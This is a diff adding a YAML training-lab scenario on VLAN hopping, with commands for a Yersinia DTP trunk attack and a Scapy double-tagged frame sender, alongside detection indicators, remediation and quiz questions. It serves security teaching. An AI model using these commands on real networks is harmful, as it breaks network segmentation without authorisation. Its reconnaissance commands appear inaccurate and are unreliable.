@@ -1,0 +1,106 @@
+# Category: Network Security
+name: "VLAN Hopping – Switch Spoofing and Double Tagging"
+id: "network-vlan-hopping-001"
+category: "network_security"
+subcategory: "lan"
+difficulty: "advanced"
+estimated_time: "75 minutes"
+
+description: |
+  Exploit VLAN misconfigurations to hop from one VLAN to another. Two common
+  techniques: Switch Spoofing (negotiate a trunking link) and Double Tagging
+  (QinQ) to send packets to a different VLAN. This allows an attacker in one
+  VLAN to reach hosts in other VLANs, bypassing segmentation.
+
+learning_objectives:
+  - Understand VLAN tagging (802.1Q) and trunking
+  - Perform switch spoofing to establish a trunk
+  - Use double‑tagged frames to bypass VLAN filters
+  - Access sensitive network segments
+
+tools:
+  - Yersinia
+  - nmap (with VLAN ID)
+  - scapy (Python)
+  - dsniff (macof)
+
+prerequisites:
+  - Physical access to a switch port (or ability to send raw frames)
+  - Switch port configured in dynamic desirable/auto mode (for switch spoofing)
+  - For double‑tagging: native VLAN mismatch
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Discover VLAN topology"
+    commands:
+      - "# Use CDP or LLDP to gather switch info"
+      - "cdp enable"
+      - "# Or use nmap to probe"
+      - "nmap -e eth0 --script broadcast-dhcp6-discover"
+    expected_output: "VLAN IDs and trunk interfaces"
+    detection: "CDP/LLDP frames on network"
+
+  - id: "step2"
+    phase: "exploitation_switch_spoofing"
+    action: "Negotiate trunk with switch"
+    commands:
+      - "# Using Yersinia to send DTP packets"
+      - "yersinia dtp -attack 1 -interface eth0"
+      - "# Or manually send a DTP packet to become trunk"
+    expected_output: "Attacker's port becomes trunk, allowing access to all VLANs"
+    detection: "Switch logs showing trunk negotiation from unauthorized port"
+
+  - id: "step3"
+    phase: "exploitation_double_tagging"
+    action: "Send double‑tagged frames to target VLAN"
+    commands:
+      - "# Using scapy:"
+      - "from scapy.all import *"
+      - "pkt = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst='192.168.20.1')/ICMP()"
+      - "sendp(pkt, iface='eth0')"
+      - "# This works if native VLAN is 10 and target is 20"
+    expected_output: "ICMP reachability to host in VLAN 20"
+    detection: "Unusual tagged traffic; VLAN mismatch in logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1046"
+    description: "Network Service Scanning"
+  - standard: "CIS Switch Benchmarks"
+    control: "3.1"
+    description: "Disable trunk negotiation on access ports"
+
+detection:
+  network_indicators:
+    - "DTP packets from access ports"
+    - "Double‑tagged frames (QinQ) where not expected"
+  log_indicators:
+    - "Switch logs showing VLAN hopping attempts"
+  endpoint_indicators:
+    - "Yersinia or scapy execution"
+
+remediation:
+  immediate:
+    - "Set all ports to 'access' mode and disable trunking"
+    - "Use native VLAN ID different from user VLANs"
+    - "Enable VLAN Access Control Lists (VACLs)"
+  long_term:
+    - "Implement Private VLANs to further isolate hosts"
+    - "Use 802.1X authentication on edge ports"
+
+variables:
+  native_vlan: 10
+  target_vlan: 20
+  target_ip: "192.168.20.1"
+
+assessment_questions:
+  - "What protocol is used for trunk negotiation between switches?"
+  - "How does double tagging bypass VLAN segmentation?"
+  - "Why does using a dedicated native VLAN ID (e.g., 999) reduce risk?"
+
+references:
+  - url: "https://www.cisco.com/c/en/us/support/docs/lan-switching/virtual-lans-vlans/41860-which-vlan.html"
+    title: "Cisco VLAN Hopping Guide"
+  - url: "https://attack.mitre.org/techniques/T1046/"
+    title: "MITRE - Network Service Scanning"
